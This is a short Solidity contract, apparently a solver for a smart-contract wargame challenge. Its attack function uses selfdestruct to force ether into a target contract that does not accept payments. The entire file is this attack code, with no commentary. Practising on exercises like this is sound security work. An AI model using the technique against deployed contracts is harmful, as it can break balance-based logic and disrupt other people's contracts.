// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceSolver {
    receive() external payable {}
    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}